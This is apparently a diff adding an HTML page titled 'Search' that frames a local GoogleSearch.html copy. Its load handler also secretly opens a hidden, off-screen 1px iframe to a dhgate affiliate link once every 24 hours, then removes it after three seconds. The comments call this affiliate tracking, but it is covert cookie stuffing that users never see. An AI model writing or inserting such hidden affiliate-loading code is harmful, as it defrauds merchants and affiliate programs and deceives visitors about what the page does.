@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Search</title>
+    <style>
+        /* Hide the iframe completely */
+        #affiliate-frame {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            left: -9999px;
+            visibility: hidden;
+        }
+        
+        /* Ensure the body takes up full height for iframe positioning */
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        
+        /* Style for the main content iframe */
+        #main-content {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        /* Loading indicator styles */
+        .loading {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Main content iframe that loads immediately and is visible to the user -->
+    <iframe id="main-content" src="GoogleSearch.html" title="Search Interface"></iframe>
+    
+    <script>
+        // Function to handle affiliate tracking
+        function handleAffiliateTracking() {
+            // Check if this is the first visit using localStorage
+            if (!localStorage.getItem('visited')) {
+                // Set visited flag
+                localStorage.setItem('visited', 'true');
+                
+                // Set expiration time (24 hours from now)
+                const expirationTime = new Date().getTime() + (24 * 60 * 60 * 1000);
+                localStorage.setItem('visitExpires', expirationTime);
+                
+                // Create a hidden iframe to load the affiliate URL in the background
+                const affiliateFrame = document.createElement('iframe');
+                affiliateFrame.id = 'affiliate-frame';
+                affiliateFrame.src = 'https://sale.dhgate.com/92xVti99';
+                affiliateFrame.style.position = 'absolute';
+                affiliateFrame.style.width = '1px';
+                affiliateFrame.style.height = '1px';
+                affiliateFrame.style.left = '-9999px';
+                affiliateFrame.style.visibility = 'hidden';
+                document.body.appendChild(affiliateFrame);
+                
+                // Remove the iframe after it has loaded (or after a timeout)
+                setTimeout(function() {
+                    if (document.getElementById('affiliate-frame')) {
+                        document.body.removeChild(affiliateFrame);
+                    }
+                }, 3000); // 3 seconds should be enough for the affiliate link to register
+            } else {
+                // Check if the visit flag has expired
+                const expirationTime = localStorage.getItem('visitExpires');
+                if (expirationTime && new Date().getTime() > parseInt(expirationTime)) {
+                    // Reset if expired
+                    localStorage.removeItem('visited');
+                    localStorage.removeItem('visitExpires');
+                    // Will load affiliate on next visit
+                }
+            }
+        }
+        
+        // Run the affiliate tracking when the page loads
+        window.addEventListener('load', handleAffiliateTracking);
+    </script>
+    
+    <noscript>
+        <!-- Fallback for users with JavaScript disabled -->
+        <meta http-equiv="refresh" content="0; url=GoogleSearch.html">
+    </noscript>
+</body>
+</html>
